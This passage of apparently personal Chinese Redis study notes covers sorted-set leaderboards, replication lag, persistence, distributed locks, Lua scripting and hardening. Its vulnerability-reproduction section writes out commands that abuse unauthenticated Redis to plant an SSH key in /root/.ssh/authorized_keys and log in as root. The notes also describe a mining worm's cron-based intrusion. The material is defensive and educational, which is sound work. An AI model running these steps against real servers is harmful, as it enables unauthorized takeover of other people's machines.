class="line">查询玩家 <span class="number">10001</span> 的分数可以使用：ZSCORE user_score <span class="number">10001</span></span><br><span class="line"></span><br><span class="line">查询某个玩家的排名</span><br><span class="line">查询玩家 <span class="number">10001</span> 的排名可以使用：ZREVRANK user_score <span class="number">10001</span></span><br><span class="line"></span><br><span class="line">对玩家的分数和排名进行更新</span><br><span class="line">对玩家 <span class="number">10001</span> 的分数减 <span class="number">1</span>，可以使用：ZINCRBY user_score <span class="number">-1</span> <span class="number">10001</span></span><br><span class="line"></span><br><span class="line">查询指定玩家前后 M 名的玩家</span><br><span class="line">查询玩家 <span class="number">10001</span> 前后 <span class="number">5</span> 名玩家都是谁，当前已知玩家 <span class="number">10001</span> 的排名是 <span class="number">18036</span>，</span><br><span class="line">那么可以使用：ZREVRANGE user_score <span class="number">18031</span> <span class="number">18041</span></span><br><span class="line"></span><br><span class="line">增加或移除某个玩家，并对排名进行更新</span><br><span class="line">删除玩家 <span class="number">10001</span>，可以使用：ZREM user_score <span class="number">10001</span></span><br><span class="line">查询下排名在 <span class="number">18031</span> 到 <span class="number">18041</span> 的玩家是谁，使用：ZREVRANGE user_score <span class="number">18031</span> <span class="number">18041</span></span><br><span class="line"></span><br><span class="line">把玩家 <span class="number">10001</span> 的信息再增加回来，使用：ZADD user_score <span class="number">93.1504697596</span> <span class="number">10001</span></span><br><span class="line">看下排名在 <span class="number">18031</span> 到 <span class="number">18041</span> 的玩家是谁，使用：ZREVRANGE user_score <span class="number">18031</span> <span class="number">18041</span></span><br><span class="line">https:<span class="comment">//learnku.com/articles/37066</span></span><br></pre></td></tr></table></figure>
<h3 id="redis安全"><a href="#redis安全" class="headerlink" title="redis安全"></a>redis安全</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Redis 默认情况下，会绑定在 <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">6379</span>，在没有利用防火墙进行屏蔽的情况下，将会将 Redis 服务暴露到公网上，如果在没有开启认证的情况下，可以导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下利用 Redis 的相关方法，可以成功将自己的公钥写入目标服务器的 ~<span class="regexp">/.ssh 文件夹的 authotrized_keys 文件中，进而可以直接登录目标服务器；如果 Redis 服务是以 root 权限启动，可以利用该问题直接获得服务器 root 权限。</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">经过对捕获的事件进行分析，整个入侵流程大概是包含以下几个环节：</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">扫描开放 6379 端口的 Linux 服务器（后续感染扫描网段为 1.0.0.0/</span><span class="number">16</span> 到 <span class="number">224.255</span><span class="number">.0</span><span class="number">.0</span>/<span class="number">16</span> ）</span><br><span class="line">通过 redis-cli 尝试连接 Redis 并执行预置在.dat 文件里的利用命令将 Redis 的数据文件修改为 /<span class="keyword">var</span>/spool/cron/root，然后通过在 Redis 中插入数据，将下载执行脚本的动作写入 crontab 任务</span><br><span class="line">通过脚本实现以上的相关行为，完成植入并启动挖矿程序</span><br><span class="line">Redis 服务加固</span><br><span class="line"></span><br><span class="line">导致入侵的主要原因是 Redis 未授权访问问题，所以如果要扼制入侵的入口，需要针对 Redis 服务进行加固，避免黑客通过该途径进行入侵植入挖矿蠕虫。</span><br><span class="line">如无必要，修改 bind 项，不要将 Redis 绑定在 <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span> 上，避免 Redis 服务开放在外网，可以通过 iptables 或者腾讯云用户可以通过安全组限制访问来源</span><br><span class="line">在不影响业务的情况，不要以 root 启动 Redis 服务，同时建议修改默认的 <span class="number">6379</span> 端口，大部分针对 Redis 未授权问题的入侵都是针对默认端口进行的</span><br><span class="line">配置 AUTH，增加密码校验，这样即使开放在公网上，如果非弱口令的情况，黑客也无法访问 Redis 服务进行相关操作</span><br><span class="line">使用 rename-command CONFIG <span class="string">"RENAME_CONFIG"</span>重命名相关命令，这样黑客即使在连接上未授权问题的 Redis 服务，在不知道命令的情况下只能获取相关数据，而无法进一步利用 https:<span class="comment">//www.v2ex.com/t/584369</span></span><br><span class="line">docker 的 -p 如果直接 <span class="number">6379</span>:<span class="number">6379</span> 是会默认绑定 <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span> 的，而且还会自动打开防火墙的这个端口，不注意很容易被坑的，必须要-p <span class="number">127.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">6379</span>:<span class="number">6379</span> 这样用才行</span><br><span class="line">Redis 也被挖矿攻击！ https:<span class="comment">//cn.v2ex.com/t/623847#reply27  </span></span><br><span class="line"><span class="comment">// 它这个脚本保存在 value 里，怎么才能被执行到  显然 redis 公网开放，并且无认证 如果 redis 被恶意程序访问到了，那么可以利用</span></span><br><span class="line"> </span><br><span class="line">config set dir xxx</span><br><span class="line">config set dbfilename xxxx</span><br><span class="line">set xxx</span><br><span class="line">save</span><br><span class="line"> </span><br><span class="line">这几条命令在 linux 目录下创建文件。 https:<span class="comment">//p0sec.net/index.php/archives/69/</span></span><br></pre></td></tr></table></figure>
<h3 id="Redis-scard主从延时问题"><a href="#Redis-scard主从延时问题" class="headerlink" title="Redis scard主从延时问题"></a>Redis scard主从延时问题</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setPrize</span>(<span class="params">$arrPrizes</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 真实的奖品是由上面的参数$arrPrizes传入，数据格式如下：</span></span><br><span class="line">        <span class="comment">// $arrPrizes = array(</span></span><br><span class="line">        <span class="comment">//     array('code' =&gt; 'A0001', 'name' =&gt; 'iPhone'),</span></span><br><span class="line">        <span class="comment">//     array('code' =&gt; 'A0002', 'name' =&gt; 'iPhone'),</span></span><br><span class="line">        <span class="comment">// );</span></span><br><span class="line">        foreach ($arrPrizes <span class="keyword">as</span> $intIndex =&gt; $arrPrize) &#123;</span><br><span class="line">            $arrPrizes[$intIndex] = json_encode($arrPrize);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取Redis实例</span></span><br><span class="line">        $objRedis       = RedisUtil::getInstance();</span><br><span class="line">        $strRedisKey    = <span class="string">'www.daemoncoder.com'</span>;</span><br><span class="line">        $arrPrizePages  = array_chunk($arrPrizes, <span class="number">100</span>);</span><br><span class="line">        foreach ($arrPrizePages <span class="keyword">as</span> $arrPrizePage) &#123;</span><br><span class="line">            <span class="comment">// 分批写入redis中</span></span><br><span class="line">            $intAddResult = $objRedis-&gt;sAddArray($strRedisKey, $arrPrizePage);</span><br><span class="line">            echo sprintf(<span class="string">"AddResult: %s\n"</span>, var_export($intAddResult, <span class="literal">true</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 判断写入的集合最终大小是否和传入的数组大小一致</span></span><br><span class="line">        <span class="comment">// 不一致则中间有数据没有成功写入，需要返回给上层重试或者报警</span></span><br><span class="line">        $intScardResult = $objRedis-&gt;sCard($strRedisKey);</span><br><span class="line">        echo sprintf(<span class="string">"ScardResult: %s\n"</span>, var_export($intScardResult, <span class="literal">true</span>));</span><br><span class="line">        <span class="keyword">if</span> ($intScardResult == count($arrPrizes)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception $e) &#123;</span><br><span class="line">        var_dump($e);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">通过sAddArray()写入集合的数据，有部分还没有生效。Redis本身用单线程处理请求，理论不应该存在出现这种延时，但是线上环境的Redis往往都是主从结构的，主库到从库同步数据是会有延时的，这也是出现这个问题的真实的原因。</span><br><span class="line">上述代码中用RedisUtil::getInstance()来获取redis实例，前面也有介绍，这个是我们自己封装的Redis工具类，会根据不同的redis命令做读写分离。sAddArray()是一个写请求，会自动选择主库连接执行，而sCard()是一个读请求，默认会选择从库去执行。所以会出现用sCard()读取不到集合真实的大小，因为从库此时可能还没有同步到最新的数据。</span><br><span class="line">解决方案</span><br><span class="line"></span><br><span class="line">调整代码，强制让sCard()方法选择主库（每个人连接的Redis工具类不同，这里不再贴代码，大概的方式就是连接时指定主库的IP）。这样经过多次反复测试，没有再出现这个问题。</span><br><span class="line">https:<span class="comment">//www.daemoncoder.com/a/%E8%AE%B0%E4%B8%80%E6%AC%A1Redis%20scard%E8%AF%BB%E5%8F%96%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%9C%E4%B8%8D%E5%AF%B9%E7%9A%84%E9%97%AE%E9%A2%98/4d54673d?hmsr=toutiao.io&amp;utm_medium=toutiao.io&amp;utm_source=toutiao.io</span></span><br></pre></td></tr></table></figure>
<h3 id="redis数据持久化"><a href="#redis数据持久化" class="headerlink" title="redis数据持久化"></a>redis数据持久化</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">edis作为内存数据库，一共支持<span class="number">2</span>种数据持久化方案：RDB、AOF。这两种方案把数据存储到磁盘中，既可以同时使用，也可以单独使用，甚至都不使用，具体使用可以配置。</span><br><span class="line">把数据存储到磁盘主要是为了以后重用数据，或者防止系统出现故障而将数据备份到远程位置。</span><br><span class="line">rdb的主要原理是在某个时间点，把内存中所有的数据做一份快照，然后把快照中的数据保存在磁盘中。</span><br><span class="line">save 900 1     #900秒时间，至少有一条数据更新，则保存到数据文件中</span><br><span class="line">save 300 10    #300秒时间，至少有10条数据更新，则保存到数据文件中</span><br><span class="line">save 60 10000  #60秒时间，至少有10000条数据更新，则保存到数据文件中</span><br><span class="line">stop-writes-on-bgsave-error yes</span><br><span class="line">rdbcompression yes 指定存储至本地数据库时是否压缩数据，默认是yes，redis采用LZF压缩，如果为了节省CPU时间可以关闭该选项，但会导致数据库文件扁的巨大</span><br><span class="line">rdbchecksum yes 对rdb文件进行校验</span><br><span class="line">dbfilename <span class="string">"dump.rdb"</span></span><br><span class="line">dir <span class="string">"XXX"</span></span><br><span class="line">当redis的bgsave命令触发时：会fork一个新进程，在新进程中进行处理快照的操作，主进程依旧可以执行别的请求。</span><br><span class="line"></span><br><span class="line">aof持久化是将被执行的写命令，写到aof文件的末尾，以此来记录数据的变化。</span><br><span class="line">appendonly no   #是否开启aof。默认是关闭的</span><br><span class="line"># appendfsync always       # always：表示每次redis写操作都会同步写入磁盘，这样会严重降低redis速度。</span><br><span class="line">appendfsync everysec       # everysec：表示每秒同步一次（折衷，默认值），通过redis的时间事件</span><br><span class="line"># appendfsync no     # no：表示redis不主动同步aof数据。等操作系统进行数据缓存同步到磁盘(快)</span><br><span class="line"></span><br><span class="line">其实redis的bgrewriteaof命令跟bgsave命令非常相似。都是创建一个子进程，把当前的数据创建一份快照，由子进程进行保存，然后替代以前的aof文件（并不是追加都文件末尾）。</span><br><span class="line">比较关心数据，但是可以忍受几分钟数据的丢失，可以使用rdb；</span><br><span class="line">不建议只使用aof：因为rdb文件是恢复数据、复制数据的最好的办法；</span><br><span class="line">如果对数据要求特别高，可以同时使用两种方案；</span><br><span class="line">https:<span class="comment">//bettercuicui.github.io/2018/04/01/REDIS/redis%E6%95%B0%E6%8D%AE%E6%8C%81%E4%B9%85%E5%8C%96_RDB_AOF/</span></span><br></pre></td></tr></table></figure>
<h3 id="基于redis实现分布式锁"><a href="#基于redis实现分布式锁" class="headerlink" title="基于redis实现分布式锁"></a>基于redis实现分布式锁</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$ret = $<span class="keyword">this</span>-&gt;getCon()-&gt;setnx($key,<span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="number">1</span> == $ret)&#123;</span><br><span class="line">    <span class="keyword">do</span> something...</span><br><span class="line">    $<span class="keyword">this</span>-&gt;getCon()-&gt;del($key);</span><br><span class="line">&#125;</span><br><span class="line">$<span class="keyword">this</span>-&gt;getCon()-&gt;multi();</span><br><span class="line">$<span class="keyword">this</span>-&gt;getCon()-&gt;setnx($key,<span class="number">1</span>);</span><br><span class="line">$<span class="keyword">this</span>-&gt;getCon()-&gt;EXPIRE($key,$time);</span><br><span class="line">$<span class="keyword">this</span>-&gt;getCon()-&gt;exec();</span><br><span class="line">$ret = $<span class="keyword">this</span>-&gt;getCon()-&gt;set($key,<span class="number">1</span>,array(<span class="string">'nx'</span>,<span class="string">'ex'</span>=&gt;self::EXP_TIME));</span><br><span class="line"><span class="keyword">if</span>(<span class="number">1</span> == $ret)&#123;</span><br><span class="line">    <span class="keyword">do</span> something...</span><br><span class="line">    $<span class="keyword">this</span>-&gt;getCon()-&gt;del($key);</span><br><span class="line">&#125;</span><br><span class="line">$ret = $<span class="keyword">this</span>-&gt;getCon()-&gt;set($key,$random,array(<span class="string">'nx'</span>,<span class="string">'ex'</span>=&gt;self::EXP_TIME));</span><br><span class="line"><span class="keyword">if</span>(<span class="number">1</span> == $ret)&#123;</span><br><span class="line">    <span class="keyword">do</span> something...</span><br><span class="line">    <span class="keyword">if</span>($random == $<span class="keyword">this</span>-&gt;getCon()-&gt;get($key))&#123;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;getCon()-&gt;del($key);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> redis.call(<span class="string">"get"</span>,KEYS[<span class="number">1</span>]) == ARGV[<span class="number">1</span>] then</span><br><span class="line">    <span class="keyword">return</span> redis.call(<span class="string">"del"</span>,KEYS[<span class="number">1</span>])</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">end</span><br><span class="line">https:<span class="comment">//bettercuicui.github.io/2018/04/01/REDIS/%E5%9F%BA%E4%BA%8Eredis%E5%AE%9E%E7%8E%B0%E5%88%86%E5%B8%83%E5%BC%8F%E9%94%81/</span></span><br></pre></td></tr></table></figure>
<h3 id="Redis-使用-lua-脚本"><a href="#Redis-使用-lua-脚本" class="headerlink" title="Redis 使用 lua 脚本"></a>Redis 使用 lua 脚本</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">减少网络开销，一个脚本包含多个命令</span><br><span class="line">原子操作， redis 是单线程的，Redis 的 API 是原子性的操作，所以一个脚本在 Redis 里面是作为一个整体执行，中途不会被插入其他操作，脚本本身就是事务，更简单，速度更快</span><br><span class="line">可复用，客户端发送的脚步会永久存在 redis 中，这样，其他客户端可以复用这一脚本而不需要使用代码完成相同的逻辑</span><br><span class="line"># KEYS和ARGV中间的 ',' 两边的空格，不能省略。 </span><br><span class="line">Redis-cli -h address -p port --<span class="built_in">eval</span> path/to/redis.lua KEYS[<span class="number">1</span>] KEYS[<span class="number">2</span>] , ARGV[<span class="number">1</span>] ARGV[<span class="number">2</span>] </span><br><span class="line"></span><br><span class="line">$redisHost = <span class="string">'127.0.0.1'</span>;</span><br><span class="line">$redisPort = <span class="number">6379</span>;</span><br><span class="line"><span class="comment">//实例化redis类</span></span><br><span class="line">$redis = <span class="keyword">new</span> Redis();</span><br><span class="line">$redis-&gt;connect($redisHost, $redisPort);</span><br><span class="line">$lua = &lt;&lt;&lt;SCRIPT</span><br><span class="line">      return &#123;KEYS[1],KEYS[2],ARGV[1],ARGV[2]&#125;</span><br><span class="line">SCRIPT;</span><br><span class="line">//对应的redis命令如下 eval "return &#123;KEYS[1],KEYS[2],ARGV[1],ARGV[2]&#125;" 2 key1 key2 first second</span><br><span class="line">//2表示KEYS的值为前2个，剩下的参数为ARGV</span><br><span class="line">$s = $redis-&gt;eval($lua,array('key1','key2','first','second'),2);</span><br><span class="line">var_dump($s);</span><br><span class="line">https://learnku.com/articles/37766</span><br></pre></td></tr></table></figure>
<h3 id="redis未授权-amp-弱密码漏洞复现和防护"><a href="#redis未授权-amp-弱密码漏洞复现和防护" class="headerlink" title="redis未授权&amp;弱密码漏洞复现和防护"></a>redis未授权&amp;弱密码漏洞复现和防护</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/redis/redis.conf，注释掉bind <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> ::<span class="number">1</span>即让redis监听所有网段</span><br><span class="line">$ redis-cli -h <span class="number">192.168</span><span class="number">.99</span><span class="number">.100</span></span><br><span class="line"><span class="number">192.168</span><span class="number">.99</span><span class="number">.100</span>:<span class="number">6379</span>&gt; info</span><br><span class="line">写ssh公钥实现远程登陆</span><br><span class="line"></span><br><span class="line">首先生产密钥对：</span><br><span class="line"> </span><br><span class="line">ssh-keygen -t rsa</span><br><span class="line">将公钥制作成上传文件：</span><br><span class="line"> </span><br><span class="line">(echo -e <span class="string">"\n\n\n"</span>; cat ~<span class="regexp">/.ssh/i</span>d_rsa.pub; echo -e <span class="string">"\n\n\n"</span>) &gt; upload.txt</span><br><span class="line">将上传文件保存在redis-cli的临时变量中：</span><br><span class="line"> </span><br><span class="line">cat ~<span class="regexp">/upload.txt | redis-cli -h 192.168.99.100 -x set tmp</span></span><br><span class="line"><span class="regexp">连接redis，将tmp变量的内容写入/</span>root/.ssh/authorized_keys:</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">redis-cli -h <span class="number">192.168</span><span class="number">.99</span><span class="number">.100</span></span><br><span class="line">config set dir /root/.ssh</span><br><span class="line">config set dbfilename authorized_keys</span><br><span class="line">get tmp</span><br><span class="line">save</span><br><span class="line">接着使用私钥即可登陆靶机：</span><br><span class="line"> </span><br><span class="line">ssh -i ~<span class="regexp">/.ssh/i</span>d_rsa root@<span class="number">192.168</span><span class="number">.99</span><span class="number">.100</span></span><br><span class="line"></span><br><span class="line">写crontab文件反弹shell</span><br><span class="line"></span><br><span class="line">crontab跟ssh差不多，但是笔者再ubuntu18<span class="number">.04</span>中复现失败，原因是写入的crontab文件存在redis的一些字符，导致格式不正确</span><br><span class="line">使用apt install redis-server的方式安装，并且使用service redis start启动redis，这样redis会在一个低权限用户下运行</span><br><span class="line">[root@VM_0_11_centos ~]# ps -ef |grep redis</span><br><span class="line">redis     <span class="number">2538</span>     <span class="number">1</span>  <span class="number">0</span> Nov14 ?        <span class="number">00</span>:<span class="number">25</span>:<span class="number">57</span> /usr/bin/redis-server <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6379</span></span><br><span class="line">root     <span class="number">16915</span>  <span class="number">8467</span>  <span class="number">0</span> <span class="number">11</span>:<span class="number">06</span> pts/<span class="number">0</span>    <span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span> grep --color=auto redis</span><br><span class="line"></span><br><span class="line">若必须以root身份运行，为redis设置一定强度的密码（实际复现中我们可以发现，新版redis在以root运行，不设置密码的情况下会启动保护模式，只允许本地cli）</span><br><span class="line">定时检查redis日志</span><br><span class="line">cat /etc/redis.conf |grep logfile</span><br><span class="line">logfile /<span class="keyword">var</span>/log/redis/redis.log</span><br><span class="line">[root@VM_0_11_centos ~]# more /var/log/redis/redis.log</span><br><span class="line">https:<span class="comment">//anemone.top/%E7%BB%84%E4%BB%B6-redis%E6%9C%AA%E6%8E%88%E6%9D%83-%E5%BC%B1%E5%AF%86%E7%A0%81%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E9%98%B2%E6%8A%A4/</span></span><br></pre></td></tr></table></figure>
<h3 id="删除大key"><a href="#删除大key" class="headerlink" title="删除大key"></a>删除大key</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">vendor/predis/predis/src/Collection/Iterator/Keyspace.php:<span class="number">22</span></span><br><span class="line">laravel predis   https:<span class="comment">//github.com/nrk/predis/blob/v1.0/examples/redis_collections_iterators.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; <span class="number">5</span>; ++$i) &#123;</span><br><span class="line">    $client-&gt;sadd(<span class="string">'predis:set'</span>, <span class="string">"member:$i"</span>);</span><br><span class="line">    $client-&gt;zadd(<span class="string">'predis:zset'</span>, -$i, <span class="string">"member:$i"</span>);</span><br><span class="line">    $client-&gt;hset(<span class="string">'predis:hash'</span>, <span class="string">"field:$i"</span>, <span class="string">"value:$i"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// === Keyspace iterator based on SCAN ===</span></span><br><span class="line">echo <span class="string">'Scan the keyspace matching only our prefixed keys:'</span>, PHP_EOL;</span><br><span class="line">foreach (<span class="keyword">new</span> Iterator\Keyspace($client, <span class="string">'predis:*'</span>) <span class="keyword">as</span> $key) &#123;</span><br><span class="line">    echo <span class="string">" - $key"</span>, PHP_EOL;$client-&gt;del($key);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* OUTPUT</span></span><br><span class="line"><span class="comment">Scan the keyspace matching only our prefixed keys:</span></span><br><span class="line"><span class="comment"> - predis:zset</span></span><br><span class="line"><span class="comment"> - predis:set</span></span><br><span class="line"><span class="comment"> - predis:hash</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">scanAllForMatch</span> (<span class="params">$pattern, $cursor=null, $allResults=array(</span>)) </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Zero means full iteration</span></span><br><span class="line">    <span class="keyword">if</span> ($cursor===<span class="string">"0"</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> $allResults;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// No $cursor means init</span></span><br><span class="line">    <span class="keyword">if</span> ($cursor===<span class="literal">null</span>) &#123;</span><br><span class="line">        $cursor = <span class="string">"0"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// The call</span></span><br><span class="line">    $result = Redis::scan($cursor, <span class="string">'match'</span>, $pattern);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Append results to array</span></span><br><span class="line">    $allResults = array_merge($allResults, $result[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Recursive call until cursor is 0</span></span><br><span class="line">    <span class="keyword">return</span> scanAllForMatch($pattern, $result[<span class="number">0</span>], $allResults);</span><br><span class="line">&#125;</span><br><span class="line">$allResults = scanAllForMatch(<span class="string">'*keypattern*'</span>);https:<span class="comment">//stackoverflow.com/questions/35477172/laravel-and-redis-scan</span></span><br><span class="line">$redis-&gt;pconnect($redisConf[<span class="number">0</span>], $redisConf[<span class="number">1</span>], $timeout);</span><br><span class="line">    <span class="comment">//默认SCAN_NORETRY情况下有可能会返回空数组，设置成SCAN_RETRY，如果是空数组的话，将不返回继续扫描下去</span></span><br><span class="line">    $redis-&gt;setOption(\Redis::OPT_SCAN, \Redis::SCAN_RETRY);</span><br><span class="line">    $it = NULL;</span><br><span class="line">    <span class="keyword">while</span> ($arr_keys = $redis-&gt;scan($it, <span class="attr">CacheKeyConfig</span>::CachePre.<span class="string">'*'</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (is_array($arr_keys)) &#123;</span><br><span class="line">            <span class="comment">//推荐使用unlink函数，非阻塞删除，删除大key时很好用，但是它需要redis版本&gt;=4.0</span></span><br><span class="line">            $result = $redis-&gt;del($arr_keys);</span><br><span class="line">                echo $result . PHP_EOL;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">链接：https:<span class="comment">//juejin.im/post/5cf4e52e6fb9a07ecd3d46fe</span></span><br><span class="line"> $it = NULL;</span><br><span class="line"> <span class="keyword">while</span>($arr_keys = 